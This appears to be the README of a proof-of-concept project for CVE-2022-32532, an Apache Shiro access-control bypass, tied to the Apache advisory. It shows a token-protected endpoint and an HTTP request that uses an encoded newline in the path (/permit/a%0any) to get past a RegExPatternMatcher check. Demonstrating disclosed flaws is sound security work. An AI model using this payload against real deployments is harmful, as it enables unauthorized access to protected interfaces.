# CVE-2022-32532

## about

This is a demo project, which only shows one of the conditions for exploiting this vulnerability (CVE-2022-32532). 

In fact, there are more ways to exploit it, as long as developers use `RegExPatternMatcher`, there will be a possible bypass vulnerability.

## introduce

Token request header verification is required under the current configuration, otherwise you do not have permission to access the interface under `/permit`

This request can succeed
```http request
GET /permit/any HTTP/1.1
Token: 4ra1n
```

Access is not allowed when there is no token request header
```http request
GET /permit/any HTTP/1.1
```

It can be bypassed in a simple way in special but common configurations
```http request
GET /permit/a%0any HTTP/1.1
```

## reference

https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh

This vulnerability is similar to Spring-Security [CVE-2022-22978](https://tanzu.vmware.com/security/cve-2022-22978)

Thanks to [bdemers](https://github.com/bdemers) (Apache Shiro PMC) and [chybeta](https://github.com/chybeta) (Security Researcher)
